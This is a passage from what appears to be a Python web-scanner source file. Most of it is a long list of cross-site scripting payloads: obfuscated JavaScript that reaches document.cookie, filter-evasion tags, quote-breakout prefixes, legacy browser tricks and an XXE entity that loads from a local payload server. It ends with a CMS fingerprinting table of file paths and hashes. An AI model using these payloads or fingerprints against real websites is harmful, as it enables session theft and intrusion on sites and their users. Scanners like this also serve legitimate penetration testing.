             'window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]',
             'this["ale"+(!![]+[])[-~[]]+(!![]+[])[+[]]]()', 'this["ale"+"\\x72\\x74"]()',
             'this["\\x61\\x6c\\x65\\x72\\x74"]()', "this['ale'+'\\x72\\x74']()", "this['\\x61\\x6c\\x65\\x72\\x74']()",
             'this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))',
             'this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]',
             'this["document"]["cookie"]', 'this["document"]["\\x63\\x6f\\x6f\\x6b\\x69\\x65"]',
             'this["\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74"]["cookie"]',
             'this["\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74"]["\\x63\\x6f\\x6f\\x6b\\x69\\x65"]',
             'this["document"][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"kie"]',
             'this["document"][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"\\x6b\\x69\\x65"]',
             'this["docum"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"\\x6b\\x69\\x65"]',
             'this["docum"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"kie"]',
             'this["docum"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]["\\x63\\x6f\\x6f\\x6b\\x69\\x65"]',
             'this["docum"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]["cookie"]',
             'this["\\x64\\x6f\\x63\\x75\\x6d"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"\\x6b\\x69\\x65"]',
             'this["\\x64\\x6f\\x63\\x75\\x6d"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"kie"]',
             'this["\\x64\\x6f\\x63\\x75\\x6d"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]["\\x63\\x6f\\x6f\\x6b\\x69\\x65"]',
             'this["\\x64\\x6f\\x63\\x75\\x6d"+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]["cookie"]',
             "this['document']['cookie']", "this['document']['\\x63\\x6f\\x6f\\x6b\\x69\\x65']",
             "this['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['cookie']",
             "this['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x63\\x6f\\x6f\\x6b\\x69\\x65']",
             "this['document'][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie']",
             "this['document'][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'\\x6b\\x69\\x65']",
             "this['docum'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'\\x6b\\x69\\x65']",
             "this['docum'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie']",
             "this['docum'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]['\\x63\\x6f\\x6f\\x6b\\x69\\x65']",
             "this['docum'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]['cookie']",
             "this['\\x64\\x6f\\x63\\x75\\x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'\\x6b\\x69\\x65']",
             "this['\\x64\\x6f\\x63\\x75\\x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie']",
             "this['\\x64\\x6f\\x63\\x75\\x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]['\\x63\\x6f\\x6f\\x6b\\x69\\x65']",
             "this['\\x64\\x6f\\x63\\x75\\x6d'+([][+[]]+[])[!+[]+!![]+!![]]+([][+[]]+[])[+!![]]+(!![]+[])[+[]]]['cookie']",
             'document["cookie"]', 'document["\\x63\\x6f\\x6f\\x6b\\x69\\x65"]',
             'document[({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"kie"]',
             'document[({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+"\\x6b\\x69\\x65"]',
             "document['cookie']", "document['\\x63\\x6f\\x6f\\x6b\\x69\\x65']",
             "document[({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'kie']",
             "document[({}+[])[!+[]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}+[])[+!![]]+'\\x6b\\x69\\x65']",
             '%3Cscript%3Edocument.body.innerHTML=%22%3Ca%20onmouseover%0B=location=%27\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x63\\x6F\\x6E\\x66\\x69\\x72\\x6D\\x26\\x6C\\x70\\x61\\x72\\x3B\\x64\\x6F\\x63\\x75\\x6D\\x65\\x6E\\x74\\x2E\\x63\\x6F\\x6F\\x6B\\x69\\x65\\x26\\x72\\x70\\x61\\x72\\x3B%27%3E%3Cinput%20name=attributes%3E%22;%3C/script%3E',
             '<meta http-equiv="X-UA-Compatible" content="IE=5"><p style="font-family:\',;a\\\\22\\\\3e\\\\3cimg\\\\20src\\\\3dx\\\\20onerror\\\\3d\\\\61lert\\\\28\\\\31\\\\29\\\\3e:1\'">oh-oh</p>',
             '"><meta http-equiv="X-UA-Compatible" content="IE=5"><p style="font-family:\',;a\\\\22\\\\3e\\\\3cimg\\\\20src\\\\3dx\\\\20onerror\\\\3d\\\\61lert\\\\28\\\\31\\\\29\\\\3e:1\'">oh-oh</p>',
             '\'><meta http-equiv="X-UA-Compatible" content="IE=5"><p style="font-family:\',;a\\\\22\\\\3e\\\\3cimg\\\\20src\\\\3dx\\\\20onerror\\\\3d\\\\61lert\\\\28\\\\31\\\\29\\\\3e:1\'">oh-oh</p>',
             "<iframe/onload=action=/confir/.source+'m';eval(action)(1)>",
             '"><iframe/onload=action=/confir/.source+\'m\';eval(action)(1)>',
             "'><iframe/onload=action=/confir/.source+'m';eval(action)(1)>",
             '<!--[if WindowsEdition]><script>confirm(1);</script><![endif]-->',
             '"><!--[if WindowsEdition]><script>confirm(1);</script><![endif]-->',
             "'><!--[if WindowsEdition]><script>confirm(1);</script><![endif]-->", '<img src=x onerror=confirm(/X/)>',
             '"><img src=x onerror=confirm(/X/)>', "'><img src=x onerror=confirm(/X/)>",
             '<form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(1)> <button/type=submit>',
             '"><form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(1)> <button/type=submit>',
             "'><form/action=ja&Tab;vascr&Tab;ipt&colon;confirm(1)> <button/type=submit>",
             '<style/onload    =    !-alert&#x28;1&#x29;>', '"><style/onload    =    !-alert&#x28;1&#x29;>',
             "'><style/onload    =    !-alert&#x28;1&#x29;>",
             '<iframe/name="if(0){\\u0061lert(1)}else{\\u0061lert(1)}"/onload="eval(name)";>',
             '"><iframe/name="if(0){\\u0061lert(1)}else{\\u0061lert(1)}"/onload="eval(name)";>',
             '\'><iframe/name="if(0){\\u0061lert(1)}else{\\u0061lert(1)}"/onload="eval(name)";>',
             '<svg><?GMO=`<ftw=`skrowtillehehtwoh; onload=confirm(location);',
             '"><svg><?GMO=`<ftw=`skrowtillehehtwoh; onload=confirm(location);',
             "'><svg><?GMO=`<ftw=`skrowtillehehtwoh; onload=confirm(location);", '"><img src=x onerror=confirm(1);>',
             '#&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;', '<img/src=x alt=confirm(1) onerror=eval(alt)>',
             '"><img/src=x alt=confirm(1) onerror=eval(alt)>', "'><img/src=x alt=confirm(1) onerror=eval(alt)>",
             '<img src=x onerror=alert(1)//>', '"><img src=x onerror=alert(1)//>', "'><img src=x onerror=alert(1)//>",
             '<svg><g/onload=alert(1)//', '"><svg><g/onload=alert(1)//', "'><svg><g/onload=alert(1)//",
             '<iframe/\\/src=jAva&Tab;script:alert(1)>', '"><iframe/\\/src=jAva&Tab;script:alert(1)>',
             "'><iframe/\\/src=jAva&Tab;script:alert(1)>", '<math><mi//xlink:href="data:x,<script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>">',
             'onClick="alert(\'Hello \\u0022>\')"', 'onload=alert(1)', '" onload=alert(1) "', '" onload=alert(1)',
             'onload=alert(1) "', '" onload=alert(1) id="a', 'onload =alert(1) id="a', "<a href='", '"><a href=\'',
             "'><a href='", "javascript:alert(1)'>a</a>",
             '<listing>&lt;img onerror="alert(1);//" src=1&gt;<t t></listing>',
             '"><listing>&lt;img onerror="alert(1);//" src=1&gt;<t t></listing>',
             '\'><listing>&lt;img onerror="alert(1);//" src=1&gt;<t t></listing>',
             "<img src=x id/=' onerror=alert(1)//'>", '"><img src=x id/=\' onerror=alert(1)//\'>',
             "'><img src=x id/=' onerror=alert(1)//'>",
             '<textarea>X</textarea><!--</textarea><img src=x onerror=alert(1)>-->',
             '"><textarea>X</textarea><!--</textarea><img src=x onerror=alert(1)>-->',
             "'><textarea>X</textarea><!--</textarea><img src=x onerror=alert(1)>-->",
             '<b><noscript><!-- </noscript><img src=xx: onerror=alert(1) --></noscript>',
             '"><b><noscript><!-- </noscript><img src=xx: onerror=alert(1) --></noscript>',
             "'><b><noscript><!-- </noscript><img src=xx: onerror=alert(1) --></noscript>",
             '<b><noscript><a alt="</noscript><img src=xx: onerror=alert(1)>"></noscript>',
             '"><b><noscript><a alt="</noscript><img src=xx: onerror=alert(1)>"></noscript>',
             '\'><b><noscript><a alt="</noscript><img src=xx: onerror=alert(1)>"></noscript>',
             '<body><template><s><template><s><img src=x onerror=alert(1)>X</s></template></s></template>',
             '"><body><template><s><template><s><img src=x onerror=alert(1)>X</s></template></s></template>',
             "'><body><template><s><template><s><img src=x onerror=alert(1)>X</s></template></s></template>",
             '<a href="\x01java\x03script:alert(1)">X<a>', '"><a href="\x01java\x03script:alert(1)">X<a>',
             '\'><a href="\x01java\x03script:alert(1)">X<a>',
             '\x01<option><style></option></select><b><img src=xx: onerror=alert(1)></style></option>',
             '<option><iframe></select><b><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script></iframe></option>', '<b><style><style/><img src=xx: onerror=alert(1)>',
             '"><b><style><style/><img src=xx: onerror=alert(1)>', "'><b><style><style/><img src=xx: onerror=alert(1)>",
             '<b><style><style////><img src=xx: onerror=alert(1)></style>',
             '"><b><style><style////><img src=xx: onerror=alert(1)></style>',
             "'><b><style><style////><img src=xx: onerror=alert(1)></style>",
             '<image name=body><image name=adoptNode>X<image name=firstElementChild><svg onload=alert(1)>',
             '"><image name=body><image name=adoptNode>X<image name=firstElementChild><svg onload=alert(1)>',
             "'><image name=body><image name=adoptNode>X<image name=firstElementChild><svg onload=alert(1)>",
             '<image name=activeElement><svg onload=alert(1)>', '"><image name=activeElement><svg onload=alert(1)>',
             "'><image name=activeElement><svg onload=alert(1)>",
             '<image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>',
             '"><image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>',
             "'><image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>",
             '<div onmouseout="javascript:alert(/X/)" x=yscript: n>X',
             '"><div onmouseout="javascript:alert(/X/)" x=yscript: n>X',
             '\'><div onmouseout="javascript:alert(/X/)" x=yscript: n>X', '<div wow=removeme onmouseover=alert(1)>text',
             '"><div wow=removeme onmouseover=alert(1)>text', "'><div wow=removeme onmouseover=alert(1)>text",
             '<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>',
             '"><input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>',
             "'><input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>",
             '<form action="javascript:alert(1)"><button>X</button></form>',
             '"><form action="javascript:alert(1)"><button>X</button></form>',
             '\'><form action="javascript:alert(1)"><button>X</button></form>',
             '0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts(\'data:;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==\'))',
             '<input onfocus=alert(1) autofocus>', '"><input onfocus=alert(1) autofocus>',
             "'><input onfocus=alert(1) autofocus>",
             '<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg',
             '"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg',
             '\'><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>',
             '"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>',
             '\'><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>',
             '<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>',
             '"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>',
             '\'><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>',
             '<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>',
             '"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>',
             "'><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>",
             '<script>({0:#0=alert/#0#/#0#(0)})</script>', '</ScrIpt><script>({0:#0=alert/#0#/#0#(0)})</script>',
             '"><script>({0:#0=alert/#0#/#0#(0)})</script>', '</ScrIpt><script>({0:#0=alert/#0#/#0#(0)})</script>',
             "'><script>({0:#0=alert/#0#/#0#(0)})</script>", '</ScrIpt><script>({0:#0=alert/#0#/#0#(0)})</script>',
             'X<x style=`behavior:url(#default#time2)` onbegin=`alert(1)` >',
             '<meta charset="x-mac-farsi">?script ?alert(1)//?/script ?',
             '"><meta charset="x-mac-farsi">?script ?alert(1)//?/script ?',
             '\'><meta charset="x-mac-farsi">?script ?alert(1)//?/script ?', '<input onblur=focus() autofocus><input>',
             '"><input onblur=focus() autofocus><input>', "'><input onblur=focus() autofocus><input>",
             '<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(1)>X</button>',
             '"><form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(1)>X</button>',
             "'><form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(1)>X</button>",
             '1<set/xmlns=`urn:schemas-microsoft-com:time` style=`behAvior:url(#default#time2)` attributename=`innerhtml` to=`<img/src="x"onerror=alert(1)>`>',
             '1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src="."onerror=alert(1)>>',
             '<link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d',
             '"><link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d',
             "'><link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d",
             '<style>@import "data:,*%7bx:expression(alert(1))%7D";</style>',
             '"><style>@import "data:,*%7bx:expression(alert(1))%7D";</style>',
             '\'><style>@import "data:,*%7bx:expression(alert(1))%7D";</style>',
             '<table background="javascript:alert(32)"></table>', '"><table background="javascript:alert(32)"></table>',
             '\'><table background="javascript:alert(32)"></table>',
             '<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(1)">XXX</a>',
             '"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(1)">XXX</a>',
             '\'><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(1)">XXX</a>',
             '<![><img src="]><img src=x onerror=alert(1)//">', '"><![><img src="]><img src=x onerror=alert(1)//">',
             '\'><![><img src="]><img src=x onerror=alert(1)//">',
             '<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(1)//"></svg>',
             '"><svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(1)//"></svg>',
             '\'><svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(1)//"></svg>',
             '<<style><img src="</style><img src=x onerror=alert(1)//">',
             '"><<style><img src="</style><img src=x onerror=alert(1)//">',
             '\'><<style><img src="</style><img src=x onerror=alert(1)//">',
             '"><style><img src="</style><img src=x onerror=alert(1)//">',
             '\'><style><img src="</style><img src=x onerror=alert(1)//">',
             '<<li style=list-style:url() onerror=alert(1)></li>',
             '"><<li style=list-style:url() onerror=alert(1)></li>',
             "'><<li style=list-style:url() onerror=alert(1)></li>",
             '"><li style=list-style:url() onerror=alert(1)></li>',
             "'><li style=list-style:url() onerror=alert(1)></li>",
             '<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>',
             '"><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>',
             "'><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>",
             '<video onerror="alert(1)"><source></source></video></div>',
             '"><video onerror="alert(1)"><source></source></video></div>',
             '\'><video onerror="alert(1)"><source></source></video></div>',
             '<b <script>alert(1)//</script>0</script></b>', '"><b <script>alert(1)//</script>0</script></b>',
             "'><b <script>alert(1)//</script>0</script></b></div>",
             '"><b <script>alert(1)//</script>0</script></b></div>',
             "'><b <script>alert(1)//</script>0</script></b></div>", '<b><script<b></b><alert(1)</script </b></b>',
             '"><b><script<b></b><alert(1)</script </b></b>', "'><b><script<b></b><alert(1)</script </b></b></div>",
             '"><b><script<b></b><alert(1)</script </b></b></div>',
             "'><b><script<b></b><alert(1)</script </b></b></div>",
             '<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
             '"><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
             '\'><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script></div>',
             '"><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script></div>',
             '\'><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script></div>',
             '<x \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
             '"><x \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
             '\'><x \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
             '<! \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
             '"><! \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
             '\'><! \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
             '<? \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
             '"><? \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
             '\'><? \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
             '<div id="1"><embed src="javascript:alert(1)">', '"><embed src="javascript:alert(1)">',
             '\'><embed src="javascript:alert(1)"></embed>', '<script src="javascript:alert(1)">',
             '"><script src="javascript:alert(1)">', '\'><script src="javascript:alert(1)"></script>',
             '"><script src="javascript:alert(1)"></script>', '\'><script src="javascript:alert(1)"></script>',
             '<!DOCTYPE x[<!ENTITY x SYSTEM "http://127.0.0.1:3555/xss_serve_payloads/X.xxe">]><y>&x;</y>',
             '"><!DOCTYPE x[<!ENTITY x SYSTEM "http://127.0.0.1:3555/xss_serve_payloads/X.xxe">]><y>&x;</y>',
             '\'><!DOCTYPE x[<!ENTITY x SYSTEM "http://127.0.0.1:3555/xss_serve_payloads/X.xxe">]><y>&x;</y>',
             '<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>',
             '"><?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>',
             '\'><?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>',
             'onerror CDATA "alert(1)"', 'onload CDATA "alert(1)">',
             '<html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x>',
             '"><html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x>',
             '\'><html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x>',
             '<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>',
             '"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>',
             '\'><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>',
             '<div style=width:1px;filter:glow onfilterchange=alert(1)>x',
             '"><div style=width:1px;filter:glow onfilterchange=alert(1)>x',
             "'><div style=width:1px;filter:glow onfilterchange=alert(1)>x",
             '<// style=x:expression\x028alert(1)\x029>', '"><// style=x:expression\x028alert(1)\x029>',
             "'><// style=x:expression\x028alert(1)\x029>", '<event-source src="index.php" onload="alert(1)">',
             '"><event-source src="index.php" onload="alert(1)">',
             '\'><event-source src="index.php" onload="alert(1)">',
             '<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>',
             '"><a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>',
             '\'><a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>',
             '<?xml-stylesheet type="text/css"?><root style="x:expression(alert(1))"/>',
             '"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(1))"/>',
             '\'><?xml-stylesheet type="text/css"?><root style="x:expression(alert(1))"/>',
             '<object allowscriptaccess="always" data="test.swf"></object>',
             '"><object allowscriptaccess="always" data="test.swf"></object>',
             '\'><object allowscriptaccess="always" data="test.swf"></object>',
             '<style>*{x:??????????(alert(1))}</style>', '"><style>*{x:??????????(alert(1))}</style>',
             "'><style>*{x:??????????(alert(1))}</style>",
             '<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>',
             '"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>',
             '\'><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>',
             '<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(1));%7d"?>',
             '"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(1));%7d"?>',
             '\'><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(1));%7d"?>',
             '<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>',
             '"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>',
             '\'><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>',
             '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>',
             '"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>',
             '\'><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>',
             '<body oninput=alert(1)><input autofocus>', '"><body oninput=alert(1)><input autofocus>',
             '\'><body oninput=alert(1)><input autofocus><div id="1"><svg xmlns="http://www.w3.org/2000/svg">',
             '"><body oninput=alert(1)><input autofocus><div id="1"><svg xmlns="http://www.w3.org/2000/svg">',
             '\'><body oninput=alert(1)><input autofocus><div id="1"><svg xmlns="http://www.w3.org/2000/svg">']

cms_rule = ['/favicon.ico|metinfo|5d07b471f93f3283731592af17b0bbe7|',
            '/images/place/dflogin_bg.gif|HiMail|71395dec0c0ada3be92359a9d34a922a|',
            '/readme.txt|Z-Blog|9545ae859b1f52a0856dbcc12cd3f7d4|',
            '/Conf/images/driftuser.gif|V2视频会议系统|f0798b052bbcfd5c9b5505096dc46997|',
            '/theme/admin/images/upload.gif|sdcms|d5cd0c796cd7725beacb36ebd0596190|',
            '/views/images/admin/login_toptitle.jpg|gxcms|35d8b1c721044ec9571b35cbcdae5b17|',
            '/admin/images/admin_submit.jpg|74cms|74c085725f90a5ae8a6cd1d92bd872f2|',
            '/anmai/Edis/css/sudjectdiscusscss.css|anmai安脉教务管理系统|00c1372beab553740afd73f4361a4ff3|',
            '/robots.txt|EmpireCMS|35a7d501a562a638055b04e267def098|EmpireCMS|',
            '/host-manager/images/tomcat.gif|Tomcat|5dd09d79ce7a3ff15791dc3de9186cbb|',
            '/system/images/logo.png|kingcms|c38eda6e439da7e728c12822e1170615|',
            '/data/admin/ver.txt|dedecms|1021eef6c38a5af368cb54345475f9be|',
            '/resource/dgzc/webroot/css/index_V2.css|Gever|05f90919a36d4bf88f77d9b678a60091|',
            '/kingdee/login/images/formTable_left.gif|金蝶OA|6608f7047b6738178c13ff4ddc5b51f3|',
            '/login/images/toolbar_back2.gif|易想CMS|898b4bda594e8da78ad4d9613b4fc2e8|',
            '/setup/images/agree.jpg|shlcms|f373b0992d6b45ea1582e4e77cfe6cfe|',
            '/api/alipay/images/new-btn-fixed.png|口福科技|36dcbb0c2c6c1a2cce8b2d9a14fa364c|',
            '/images/rss_logo_smll.gif|DayuCms|ec91755e90eab555cc9b813a47e2642c|',
            '/images/small/m_replyp.gif|网趣商城|4c23f42e418b898ecebcf7b6aea95250|',
            '/inc/tools/iepngfix/blank.gif|mlecms|1c5e470de44c065dce6810adbfde421f|',
            '/favicon.ico|WilmarOA系统|c37be212f8ab327c222a2585a3509f37|',
            '/images/top.jpg|phpok|495bd447276d077934c297c5ab1b193|',
            '/admin/Image/Login_tit.gif|良精南方|352483c5ff2f284d92b38a9fab80cfcb|',
            '/jscal/src/css/img/cool-bg.png|cutecms|5f18225a1cae9c9ef67aa34fa2da099d|',
            '/images/Jobs_resume_up.gif|非凡建站|041718edc41fb801317c3a0b1f4b7ca9|',
